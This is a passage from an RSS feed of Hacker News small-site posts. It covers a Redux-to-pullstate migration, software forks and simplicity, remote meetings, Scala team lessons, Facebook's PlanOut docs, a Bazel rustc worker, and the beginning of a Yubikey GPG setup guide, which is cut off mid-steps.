But at the core, its implementation of the Elm architecture just doesn‚Äôt
translate well to JavaScript. With that venting out of the way‚Ä¶</p>
<h2 id="introducing-pullstate">Introducing Pullstate</h2>
<p><a href="https://github.com/lostpebble/pullstate">Pullstate</a> is a library built by
<a href="https://github.com/lostpebble">lostpebble</a>. As it describes itself:</p>
<blockquote>
<p>Ridiculously simple state stores with performant retrieval anywhere in your
React tree using the wonderful concept of React hooks!</p>
</blockquote>
<p>I migrated my project over to pullstate in a fit of boilerplate
frustration, and will never look back. By way of argument, I present <a href="https://github.com/marcusbuffett/rentseeker/commit/0dbf758dca23899b1112bd8d927dbe9914b5fd7c">the commit
where I switched from Redux to
pullstate</a>.
163 lines deleted and 86 lines added, and that‚Äôs with more actual logic. Any
library that cuts down my LoC by &gt;50% wins big points. 160 lines of
redux is obviously a tiny project. I also work on a web app with 1,000s of lines
of Redux and I can‚Äôt see why pullstate wouldn‚Äôt scale to that project, if I
could get a week or two off from more important tasks to work on it.</p>
<h3 id="boilerplate-gone">Boilerplate? Gone</h3>
<p>Since this was the most satisfying part, I‚Äôll highlight some of the bigger
chunks that were removed:</p>
<div><pre><code data-lang="diff">
Enum for action types? Gone.
<span>- export enum AppAction {
</span><span>-   AddInvestment = "AddInvestment",
</span><span>-   UpdateInvestment = "UpdateInvestment",
</span><span>-   ToggleSignInModal = "ToggleSignInModal",
</span><span>-   InvestmentUploaded = "InvestmentUploaded",
</span><span>-   Login = "Login",
</span><span>- }
</span><span></span>
Reducer? Gone.
<span>- export const appReducer = (state = defaultState, action) =&gt; {
</span><span>-   // bunch of lines...
</span><span>- };
</span><span></span>
C+P boilerplate to create a store? Gone.
<span>- const makeStore: MakeStore&lt;any&gt; = (context: Context) =&gt;
</span><span>-   createStore(
</span><span>-     appReducer,
</span><span>-     // @ts-ignore
</span><span>-     isSSR() ||
</span><span>-       (window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp;
</span><span>-         window.__REDUX_DEVTOOLS_EXTENSION__())
</span><span>-   );
</span><span></span>
Some higher-order-component nonsense? Gone.
<span>- export const wrapper = createWrapper&lt;AppState&gt;(makeStore, { debug: true });
</span><span></span>
Passing my app into that higher-order component thing? Gone.
<span>- export default wrapper.withRedux(MyApp);
</span></code></pre></div><p>With pullstate, this is all it takes to create a store:</p>
<div><pre><code data-lang="typescript"><span>export</span> <span>const</span> <span>AppStore</span> <span>=</span> <span>new</span> <span>Store</span><span>&lt;</span>{
  <span>houses</span>: <span>Investment</span>[];
  <span>// other fields...
</span><span></span>}<span>&gt;</span>({
  <span>houses</span><span>:</span> [],
  <span>// other fields...
</span><span></span>});
</code></pre></div><p>No higher-order stuff I need to copy and paste for each project, just an
exported store I can now use anywhere, contained in one file.</p>
<h3 id="reading-from-the-store">Reading from the store</h3>
<p>Reading from the store looks very similar to Redux hooks:</p>
<div><pre><code data-lang="typescript"><span>import</span> { <span>AppStore</span> } <span>from</span> <span>"src/store"</span>;
<span>// Inside component:
</span><span></span><span>const</span> <span>initialized</span> <span>=</span> <span>AppStore</span>.<span>useState</span>((<span>s</span>) <span>=&gt;</span> <span>s</span>.<span>initialized</span>);
<span>// The redux equivalent:
</span><span>// const initialized = useSelector((s: AppState) =&gt; s.initialized);
</span></code></pre></div><p>Not a big difference, but with redux I have to annotate the type to get
TypeScript to type-check. Winner: pullstate by a hair.</p>
<h3 id="updating-the-store">Updating the store</h3>
<p>This is where pullstate really shines:</p>
<div><pre><code data-lang="jsx">&lt;<span>div</span>
  <span>onClick</span><span>=</span>{() =&gt; {
    <span>AppStore</span>.<span>update</span>((<span>s</span>) =&gt; {
      <span>s</span>.<span>houses</span>.<span>push</span>(<span>newHouse</span>);
    });
  }}
/&gt;
</code></pre></div><p>Pullstate uses <a href="https://github.com/immerjs/immer">immer</a> when calling the <code>update</code>
function, so there‚Äôs no need to worry about mutation. Modify your state how
you would if you didn‚Äôt care about mutation. Type-checking also works inside the
<code>update</code> function.</p>

<p>In short, it‚Äôs a minimal API that covers everything I needed Redux to
do but with more type-safety, less footguns, and none of the RSI-inducing
boilerplate. Given how positive my experience switching to pullstate has been, I
wish there was more of it to show. There‚Äôs more to it, but I haven‚Äôt used it,
and my word count is at a nice round 1024 so I‚Äôll leave it at that (yes, I did
remove other stuff to keep it at 1024 after that note (and yes,
I removed <em>more</em> stuff to have that bit of parenthisized clarification (also,
yes, ‚Ä¶))).</p>

        </div></div>]]>
            </description>
            <link>https://mbuffett.com/posts/redux-to-pullstate/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585063</guid>
            <pubDate>Thu, 24 Sep 2020 23:56:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[From the lab to production: session-based recommendations [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24584919">thread link</a>) | @gk1
<br/>
September 24, 2020 | https://edoliberty.github.io/papers/recsys2020thd.pdf | <a href="https://web.archive.org/web/*/https://edoliberty.github.io/papers/recsys2020thd.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://edoliberty.github.io/papers/recsys2020thd.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24584919</guid>
            <pubDate>Thu, 24 Sep 2020 23:34:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simplicity and Ecosystems]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24584576">thread link</a>) | @zdw
<br/>
September 24, 2020 | https://orib.dev/simplicity.html | <a href="https://web.archive.org/web/*/https://orib.dev/simplicity.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<p>Software for users should serve the needs of users, and
not the needs of giant corporations with nearly limitless
resources.</p>

<p>Forks are an essential part of ensuring that software
serves the user. When maintainers aren't serving user needs,
forking can allow users to resolve the situation.</p>

<p>Discontent with Xfree86 leadership led to the
X.org fork. The split was triggered by licensing,
but there were rumblings of discontent with the slow pace of
progress and closed leadership style. This fork dragged X11
kicking and screaming out of the 1980s, bringing dynamically
reconfigurable multihead, composited desktops, and working
hardware acceleration -- all while shrinking the codebase
by more than 10,000 lines for the first several releases.</p>

<p>Discontent with the slow progress of GCC development
led to the EGCS fork. EGCS added many optimizations for
contemporary processors, improved C++ support, added more
frontends, and generally improved things. This fork proved
so successful that the original GCC ceased development.
EGCS got rebranded as GCC, and replaced the original.</p>

<p>There are many other examples of successful forks. Many
are former Sun projects, which forked after Oracle took
ownership.</p>

<p>But for forks to be possible, the projects need to
be simple enough to be forkable. Even better, they need
to be simple enough that multiple alternative implementations
can coexist, all growing independently and serving separate
niches.</p>

<p>Complexity forms barriers. These barriers can squeeze
out alternative implementations by increasing the resources
needed to maintain a fork. They make it harder for
a community to form and provide alternatives to users.</p>

<p>On top of that, if the costs of maintenance are high,
a source of money becomes necessary. This means either a revenue
stream, or an investor that expects a return on their investment.
Monetization becomes necessary.</p>

<p>This can result in a feedback loop. Implementers that
aren't raking in the megabucks drop out. Those who remain standing
grow their market share. They benefit from a rise in complexity
and the barriers that come with it. Because there are fewer options,
they can tighten the screws further to increase revenue, which
increases their ability to fund complexity. This can push the weaker
players out of the market, and the cycle repeats.</p>

<p>The result of this is that only a small number of well-funded
implementations survive, all of them trying to maximize profits.
Without people able to maintain viable forks, the owners of an
implementation can set a direction, and users are dragged along.</p>

<p>At this point, some of you are certainly thinking of
browsers. Browsers are just one cautionary tale. Manifest V3
is being rammed through, hobbling ad blockers.
This change would be harder to make stick if users have
places to go. But the choices are Chrome, Firefox, and Safari.
The first two are funded by Google ads.</p>

<p>But the problems caused by complexity aren't restricted to
browsers. Network protocols, deployment tools, operating systems,
init systems, and file formats are all at risk. As the complexity
grows, the ability to own our software decreases.</p>

<p>Open standards aren't enough for healthy ecosystems. Both
standards and their implementations need to be simple enough
to fork and maintain.</p>



</div>]]>
            </description>
            <link>https://orib.dev/simplicity.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24584576</guid>
            <pubDate>Thu, 24 Sep 2020 22:46:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimize Your Meetings for Engagement]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24584109">thread link</a>) | @w1nter
<br/>
September 24, 2020 | https://frantic.im/remote-meetings | <a href="https://web.archive.org/web/*/https://frantic.im/remote-meetings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <header>
    
    
  </header>
  <p>‚Äî So, does anybody have any feedback? Or questions?</p>

<p>Silence. 15 seconds feel like forever. I can‚Äôt tell by people‚Äôs expressions if they agree with what I have just presented. I know they must have things to say, why aren‚Äôt they speaking up?</p>

<p>This was so much easier with in-person meetings. Remote sucks!</p>

<h2 id="what-if-we-just-dont-know-how-to-run-remote-meetings-yet">What if we just don‚Äôt know how to run remote meetings yet?</h2>

<p>After months of attending large VC-only meetings I think I found a pattern. I‚Äôve also talked to a few people who also noticed the same thing.</p>

<p><strong>Failure modes:</strong></p>

<ul>
  <li>The person leading the meeting is talking 90% of time, and because they don‚Äôt get much feedback they just continue to fill the silence with re-iterating their points.</li>
  <li>Nobody else is speaking up.</li>
  <li>Somebody‚Äôs speaking up but they focus on a minor detail and talk through it forever, nobody‚Äôs willing to stop them</li>
  <li>In the end everyone is frustrated, the meeting feels like a waste of time and feels like it could have been replaced by a group post.</li>
</ul>

<p>But not all meetings where like that. A few were actually really good.</p>

<p><strong>Here‚Äôs the secret sauce:</strong></p>

<blockquote>
  <p>In the current realities optimize your meetings for engagement</p>
</blockquote>

<p>By engagement I mean this ‚Äî imagine you meet a bunch of old friends that you haven‚Äôt seen in a while. Everybody‚Äôs sharing their stories, and everybody else is actively listening, asking questions, and are fully immersed.</p>

<p>Just imagine the things we could do if our remote meetings felt even remotely like that.</p>

<p>First of all, it‚Äôs a mindset shift. Switch your strategy from just doing the meetings the way you did before COVID (or the way everybody else is doing it right now) to optimizing for the engagement, and wonderful things will happen.</p>

<p>I think the solution has 3 key elements: organizational, human and technology.</p>

<p><strong>Organizational:</strong></p>

<ul>
  <li>Reserve 15 minutes in the beginning to warm up your group. Don‚Äôt do ‚Äúlet‚Äôs start with status update‚Äù ‚Äî in my experience this tenses up the people involved and they mainly think about what they are going to say and are not listening / engaging. Instead, ask a question that encourages engagement (see next section).</li>
  <li>If your goal is to generate ideas or collect meaningful feedback, split the large group into several smaller groups (see <a href="http://www.theworldcafe.com/key-concepts-resources/world-cafe-method/">World Cafe Method</a>). 4 or 5 people in the meeting seem to be the maximum we can handle to keep the engagement high.</li>
</ul>

<p><strong>Human:</strong></p>

<ul>
  <li>Ask and share personal bits of information, e.g. hobbies, silly facts, or opinions on things not related to work.</li>
  <li>Overuse non-verbal expressions: gestures, smiles, nodding, etc. This will help everyone else understand your reaction.</li>
</ul>

<p><strong>Technology:</strong></p>

<ul>
  <li>Audio is extremely important. Low latency is a must to avoid people talking over each other.  The quality is very important too, good software I‚Äôve used before doesn‚Äôt broadcast your audio until it detects speech.</li>
  <li>Provide tools that expand ways to communicate non-verbally: raising hand, reactions, polls, messages.</li>
</ul>

  
  






  <div>
  <div>
    <p>Hi! My name is Alex. I‚Äôm a software engineer at Facebook, where I work on React&nbsp;Native, Oculus and Messenger. I love thinking about development experience.</p>
    <p>I write about programming, software design and side projects <a href="https://frantic.im/subscribe/" target="_blank"><svg viewBox="0 0 800 800"><path d="M493 652H392c0-134-111-244-244-244V307c189 0 345 156 345 345zm71 0c0-228-188-416-416-416V132c285 0 520 235 520 520z"></path><circle cx="219" cy="581" r="71"></circle></svg> Subscribe</a></p>
  </div>
</div>

</article></div>]]>
            </description>
            <link>https://frantic.im/remote-meetings</link>
            <guid isPermaLink="false">hacker-news-small-sites-24584109</guid>
            <pubDate>Thu, 24 Sep 2020 21:52:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scala ‚Äì Just enough rope to hang yourself (2013)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24583811">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://quii.dev/Scala_-_Just_enough_rope_to_hang_yourself | <a href="https://web.archive.org/web/*/https://quii.dev/Scala_-_Just_enough_rope_to_hang_yourself">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content"><article id="Scala - Just enough rope to hang yourself"><header><time>02 December 2013</time></header><p>Last week <a href="https://twitter.com/shinyhappydan">Dan</a> and I did a presentation at the <a href="http://joinit.springer.com/">Springer</a> offices for the <a href="https://www.meetup.com/Functional-Media/">Functional Media meetup</a> about our experiences with Scala. We thought it would be interesting to talk about the mistakes we had made with Scala as we thought that would be more interesting than rehashing a number of other talks about why Scala is or isn't good.</p>
<p><a href="https://docs.google.com/presentation/d/1_IcQejhu8byqUMj8MFqVeN3L_EitnVxwG0WUrYV3meE/pub?start=false&amp;loop=false&amp;delayms=3000">You can find the slides here</a></p>
<p>Scala is a very feature rich language and because of this there are many ways of doing things. This was how Scala was designed, to allow developers to express themselves in a flexible way in comparison to languages like Java.</p>
<p>This flexibility is a double-edged sword and I think this not only effects our team but can also effect the OSS community around Scala. Some developers see the power in being able to write DSLs or construct cool type systems which they think will be really useful but aren't actually as generalised and good as they think and can hamstring other developers. As Jeff Atwood says <a href="http://www.codinghorror.com/blog/2013/07/rule-of-three.html">writing re-usable code is hard</a> and that is especially true when with a flexible language like Scala.</p>
<p>This immediately comes to mind when I read this post by <a href="http://overwatering.org/blog/2013/12/scala-1-star-would-not-program-again/">Giles Alexander</a>.</p>
<p>I can actually appreciate some of the author's sentiments. If I started Scala without the aid of working with some very experienced programmers in a pair programming environment I imagine I would find it a nightmare too.</p>
<p>His complaints about def and val to me seem like inexperience in his team with Scala, which then means the resulting code is difficult for everyone. Again, this is Scala's flexibility hurting a team. I actually think good Scala code reads really well, but it takes some discipline and knowhow. Scala can tempt you into writing code you think looks great but is very hard for other people to read.</p>
<h2>Lessons from our talk</h2>
<p>If you want to have a productive team working with Scala, we feel you need</p>
<ul>
<li><em>An enthusiastic team</em> - A team that really wants to learn Scala where individuals demonstrate new powerful ways of getting stuff done to the rest of the team</li>
<li><em>Pair programming</em> - This helps newer people get up to scratch with Scala.</li>
<li><em>Code review</em> - You want to encourage your team to learn how to weild Scala's power but at Springer we make sure we have weekly team code review where we go over code so everyone understands</li>
<li><em>Question things</em> - "The functional way" is not a catch-all argument winner. Leveraging Scala's power is great but readability is the most important factor in code for us.</li>
<li><em>Monitor build times</em> - You cant really avoid Scala's compilation problems. But if you invest a little time with CI to measure it, you can take steps to manage it.</li>
</ul>
<h2>Generalists</h2>
<p>There seems to be a demand on a lot of developers to be "generalists" who know a number of languages and can be productive with them. This is a perfectly valid goal as it means developers generally have a broad and open mind about technical approach.</p>
<p>I'm not entirely sure if Scala is well suited to this as to write <em>good</em> Scala requires you to put effort into learning and appreciating the language. It is a power tool and it means you have to spend time to know how to use it responsibly so you can write concise, readable code.</p>
<p>Some would say this is a bad thing, but after working with Scala for a number of years now and if I was to change language I would want to make sure I picked a language which offers the same power and flexibility of Scala; otherwise I would probably feel like I am fighting the language to get things done.</p>
<p>I totally understand when people accuse Scala being cryptic and bloated, but I think that mainly comes from either using a horrible library of just being inexperienced. I think the true power of Scala is that it gives me the opportunity to express the intent of my code without the need of complicated boilerplate. However, it takes time to get good at it and to be honest that's what I like about it, there's always more to learn.</p>
</article></section></div>]]>
            </description>
            <link>https://quii.dev/Scala_-_Just_enough_rope_to_hang_yourself</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583811</guid>
            <pubDate>Thu, 24 Sep 2020 21:20:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Planout: Developer Friendly Experimentation Tool by Facebook]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24583660">thread link</a>) | @softvar
<br/>
September 24, 2020 | https://facebook.github.io/planout/docs/why-planout.html | <a href="https://web.archive.org/web/*/https://facebook.github.io/planout/docs/why-planout.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div>

<nav>
  
    <section>
      <h3>Quick start</h3>
      <ul>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/why-planout.html">
              Why PlanOut?
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/getting-started.html">
              Getting started
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/sample-web-app.html">
              Sample Web app
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/about-planout.html">
              About PlanOut
            </a>
            
          </li>
        
      </ul>
    </section>
  
    <section>
      <h3>Guides</h3>
      <ul>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/how-planout-works.html">
              How PlanOut works
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/random-operators.html">
              Random operators
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/logging.html">
              Logging
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/testing.html">
              Testing
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/planout-language.html">
              The PlanOut language
            </a>
            
              <ul>
                
                  <li>
                    <a href="https://facebook.github.io/planout/docs/getting-started-with-the-interpreter.html">
                      Getting started
                    </a>
                  </li>
                
                  <li>
                    <a href="https://facebook.github.io/planout/docs/planout-language-reference.html">
                      Language reference
                    </a>
                  </li>
                
              </ul>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/namespaces.html">
              Namespaces
            </a>
            
              <ul>
                
                  <li>
                    <a href="https://facebook.github.io/planout/docs/simple-namespaces.html">
                      Quick start
                    </a>
                  </li>
                
              </ul>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/best-practices.html">
              Best practices
            </a>
            
          </li>
        
      </ul>
    </section>
  
    <section>
      <h3>Extending PlanOut</h3>
      <ul>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/extending-logging.html">
              Extending logging
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/creating-new-operators.html">
              Creating new operators
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/creating-random-operators.html">
              Creating random operators
            </a>
            
          </li>
        
      </ul>
    </section>
  
    <section>
      <h3>Ports</h3>
      <ul>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/ports-overview.html">
              Overview
            </a>
            
          </li>
        
      </ul>
    </section>
  
</nav>


<article>
    
    

    <p>A/B tests and other randomized experiments are widely used as part of continually improving Web and mobile apps and services. PlanOut makes it easy to run both simple and complex experiments.</p>

<h3 id="focus-on-parameters">Focus on parameters</h3>

<p>PlanOut is all about providing randomized values of parameters that control your service. Instead of using a constant, just use PlanOut to determine these parameters (e.g., text size or color, the presence of a new feature, the number of items in a list). Now you have an experiment.</p>

<h3 id="from-simple-to-complex">From simple to complex</h3>

<p>It is easy to implement an A/B test in PlanOut, or other simple experiments like those involving a factorial design. But is not much harder to implement more complex designs. Multiple types of units (e.g., users, pieces of content) can be randomly assigned to parameter values in the same experiment. Experiments can also involve directly randomizing other inputs, such as randomly selecting which three friends to display to a user.</p>

<h3 id="automatic-logging">Automatic logging</h3>
<p>You will often want to keep track of which users (or other units) have been exposed to your experiment. This can make subsequent analysis more precise and prevent common errors in analysis. PlanOut calls your logging code whenever a parameter value is checked.</p>

<h3 id="advanced-features">Advanced features</h3>

<p>We created PlanOut to meet requirements from running experiments at Facebook, which gives rise to some of its more advanced features.</p>

<h4 id="serialization">Serialization</h4>
<p>Experiments can also be specified through JSON code. This can enable separate review processes for changes to the experiment, support multi-platform execution, and restrict the range of operations that should occur during experimental assignment (for reasons of, e.g., performance, correctness, static analysis). It also allows developers to implement their own tools to specify experiments without writing any code at all.</p>

<h4 id="domain-specific-language">Domain-specific language</h4>
<p>PlanOut experiments can be specified through the PlanOut language, which concisely describes an experiment using a set of primitive operations.  PlanOut language code is compiled into the JSON serialization, which can be executed by the PlanOut interpreter as needed.</p>

<h4 id="iterative-experimentation">Iterative experimentation</h4>
<p>The PlanOut library includes a basic <a href="https://facebook.github.io/planout/docs/namespaces.html">namespace class</a> for managing multiple, iterative experiments that run concurrently.</p>


    

</article>

</div></section></div>]]>
            </description>
            <link>https://facebook.github.io/planout/docs/why-planout.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583660</guid>
            <pubDate>Thu, 24 Sep 2020 21:07:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simple WireGuard Docker network setup]]>
            </title>
            <description>
<![CDATA[
Score 96 | Comments 18 (<a href="https://news.ycombinator.com/item?id=24583512">thread link</a>) | @bjoko
<br/>
September 24, 2020 | https://www.eisfunke.com/article/docker-wireguard-systemd.html | <a href="https://web.archive.org/web/*/https://www.eisfunke.com/article/docker-wireguard-systemd.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.eisfunke.com/article/docker-wireguard-systemd.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583512</guid>
            <pubDate>Thu, 24 Sep 2020 20:54:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Bazel Persistent Worker for Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24583439">thread link</a>) | @lukastyrychtr
<br/>
September 24, 2020 | https://nikhilism.com/post/2020/bazel-persistent-worker-rust/ | <a href="https://web.archive.org/web/*/https://nikhilism.com/post/2020/bazel-persistent-worker-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			

<p><a href="https://docs.bazel.build/versions/master/persistent-workers.html">Bazel persistent
workers</a> are
a cool feature that allow Bazel to start up ‚Äúcompiler‚Äù instances that can
accept multiple build requests. This brings benefits like saving startup time,
<a href="https://www.youtube.com/watch?v=0pgERydGyqo">saving the time to parse a standard
library</a> or share some cache
across compiler invocations. This allows slight speedups in rebuilds, which can
be valuable in speeding up the developer iteration cycle.</p>

<p>This is best exemplified in the existing persistent workers:</p>

<ol>
<li>The Java and Scala rules benefit from paying the cost of process startup only once (warming up the JVM and so on.)</li>
<li>The TypeScript compiler benefits from parsing all the JS standard library type definitions only once instead of on each re-compile.</li>
</ol>

<p>I have <a href="https://github.com/nikhilm/rustc-worker">just released</a> a similar
compiler wrapper for <a href="https://rust-lang.org/">Rust</a>. The unimaginatively named
<a href="https://github.com/nikhilm/rustc-worker"><code>rustc-worker</code></a> does not get any of
the above benefits, since <code>rustc</code> does not have a <a href="https://www.infoq.com/news/2020/01/rust-analyser-ide-support/">‚Äúservice‚Äù
mode</a> yet.
Instead it brings the speed up due to incremental compilation that is already
the default in Cargo builds to Bazel.</p>

<p>Since <a href="https://blog.rust-lang.org/2018/02/15/Rust-1.24.html">Rust 1.24</a>, rustc
has a notion of <a href="https://blog.rust-lang.org/2016/09/08/incremental.html">incremental
compilation</a>. When <code>-C
incremental=/a/directory</code> is passed to it (as Cargo does<sup id="fnref:1"><a href="#fn:1">1</a></sup>), intermediate state
is saved in that directory.  This allows it to rebuild the crate faster.</p>

<p>By default Bazel uses sandboxing to guarantee more hermetic builds. This means
that the <code>rustc</code> invoked does not have access to data written by prior
invocations of itself, so it cannot take advantage of incremental compilation.
This means Bazel rebuilds of Rust code are slower than their Cargo equivalents.</p>

<p>Introducing a persistent worker allows enabling incremental mode because the
worker process can introduce a cache that is shared across builds. The worker
is responsible for making sure this cache does not violate hermeticity
completely. Of course, we rely on rustc‚Äôs notion of incrementality being sound.</p>

<p>Rebuilds of <a href="https://github.com/nikhilm/ninja-rs">ninjars</a> are roughly <strong>2x faster</strong> with workers. This is not a benchmark by any means, but clearly there is an improvement.</p>

<pre><code>cargo build (incremental by default)  1.65s
bazel build (without worker)          2.47s
bazel build (with worker)             1.2s
</code></pre>

<h2 id="how-do-i-try-this-out">How do I try this out?</h2>

<p>The <a href="https://github.com/nikhilm/rustc-worker/blob/master/README.md">README</a> has instructions. There is an <a href="https://github.com/bazelbuild/rules_rust/issues/412">open issue</a> on <a href="https://github.com/bazelbuild/rules_rust">rules_rust</a> to consider integrating this in the default rules. Please upvote/participate in that issue if this is something you find useful.</p>

<p>Give it a shot and <a href="https://github.com/nikhilm/rustc-worker/issues">file issues</a> if something goes wrong.</p>

<h2 id="implementation">Implementation</h2>

<p>Writing a persistent worker is fairly easy. One has to watch for the special
argument <code>--persistent_worker</code> and then read protocol buffers on stdin. Using
<a href="https://developers.google.com/protocol-buffers">Protocol Buffers</a> in Rust is
really easy using <a href="https://github.com/danburkert/prost">Prost</a>. The only
annoying part is reading length-delimited messages from stdin. Since Prost
reads from a byte buffer, and not a stream, we need to do some <a href="https://github.com/nikhilm/rustc-worker/blob/5fc019da61bd9d707fe15d1bf0b900fc6416a829/src/lib.rs#L62">careful
reads</a>.</p>

<p>There are a few more things I need to fix, like using the path to rustc and the
Bazel compilation mode in the cache path. I‚Äôm really hoping this will
integrated into rules_rust so everyone benefits.</p>


		</section></div>]]>
            </description>
            <link>https://nikhilism.com/post/2020/bazel-persistent-worker-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583439</guid>
            <pubDate>Thu, 24 Sep 2020 20:49:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yubikey Setup Guide for Software Developers]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24583224">thread link</a>) | @zackify
<br/>
September 24, 2020 | https://zach.codes/ultimate-yubikey-setup-guide/ | <a href="https://web.archive.org/web/*/https://zach.codes/ultimate-yubikey-setup-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <ul><li><a href="#intro">Intro</a></li><li><a href="#getting-started">Getting Started</a></li><li><a href="#generating-the-master-key">Generating the Master Key</a></li><li><a href="#exporting-the-key">Exporting the Key</a></li><li><a href="#setting-up-your-yubikey">Setting up your Yubikey</a></li><li><a href="#adding-to-a-yubikey">Adding to a Yubikey</a></li><li><a href="#setting-up-gpg-signing">Setting up GPG Signing</a></li><li><a href="#using-ssh">Using SSH</a></li><li><a href="#using-duplicated-keys">Using Duplicated Keys</a></li></ul><h2 id="intro">Intro</h2><p>In the past year Yubico has updated their firmware to support Ed25519. This finally brings support for elliptical curve encryption, and much shorter ssh public keys.</p><p>Yubikeys are really useful, they allow you to do git commit signing, ssh, and store your private key on an external device.</p><p>This lets you jump between computers easily, and you never have your private key sitting on a local filesystem. </p><p>One critical piece to this setup is making backup keys, this has been covered by other blog posts, but there's a less common issue out there: plugging in a cloned key will cause a GPG error that you have to work around on your own... This is frustrating if you setup two yubikeys, and frequently use them both. </p><p>This guide will cover creating the GPG master key. Setting it up for commit signing, using this master key with ssh, how to make backups, and how to setup multiple computers. Unfortunately it's a bit involved for newcomers, but once you have this system setup, you're left with an extremely secure SSH + GPG solution!</p><h2 id="getting-started">Getting Started</h2><p>You need to purchase a <a href="https://www.yubico.com/store/">Yubikey</a> that was made after November 2019. That's around the time that 5.2.3 came out. You can read more about it <a href="https://support.yubico.com/support/solutions/articles/15000027139-yubikey-5-2-3-enhancements-to-openpgp-3-4-support">here</a>. This firmware version added support for curve25519. I have used the 5CI, 5C nano, 5C, 5 NFC, and the brand new 5C NFC. I've duplicated my master key across each of my keys. I highly recommend you buy at least two keys, so that if you lose one you are not locked out of servers or other systems.</p><p>Let's get started by installing the gpg tooling. Be sure to do this step on every computer that you plan to use your Yubikey with!</p><pre><code>brew install gnupg pinentry-mac</code></pre><p>If you're not running a mac, be sure to download the gnupg utility for your OS.</p><h2 id="generating-the-master-key">Generating the Master Key</h2><p>This will be the master GPG key for all of our Yubikeys, our ssh key is also derived from it. Open up a terminal, and create a new directory. I will use a folder called <code>gpg</code> and will reference it later. Then run the following:</p><pre><code>gpg --expert --full-gen-key</code></pre><p>Now that we are inside the gpg tool, select <code>9</code> for ECC. Followed by <code>1</code> for curve25519. </p><p>I tend to chose <code>0</code> on the next step, so that my key never expires. It will then ask for your name and email address, then you can hit "O" for okay. </p><p>The final step is a prompt to choose a password. Be sure to choose something long and very random. I wrote my secret key down on paper for safe keeping. You will need to retype this secret key a lot unfortunately. 3 times per yubikey in order to copy it over, so don't forget it!</p><h4 id="adding-subkeys">Adding subkeys</h4><p>You should now see a line outputted after its creation that looks like this:</p><pre><code>gpg: key A5CA05BB6F4730D4 marked as ultimately trusted</code></pre><p>To make our next steps easier to follow, please run this in your terminal:</p><pre><code>echo "A5CA05BB6F4730D4" &gt;&gt; keyid</code></pre><p>Replace the key id above with your own. We are just throwing it into a file in the current folder for safe keeping.</p><p>We need to create <code>authentication</code> and <code>signature</code> subkeys before our master key is complete.</p><pre><code>gpg --expert --edit-key $(cat keyid)</code></pre><p>Now we are inside the gpg tool and need to do the following:</p><pre><code>addkey
choose "11" ECC (set your own capabilities)
choose "A" Toggle the authenticate capability
type "Q"
choose "1" Curve 25519</code></pre><p>After that, you can set the expiration, and then type in your secret key to finish creating the sub key. We need to do it once more for the signing key:</p><pre><code>addkey
choose "10" ECC (sign only)
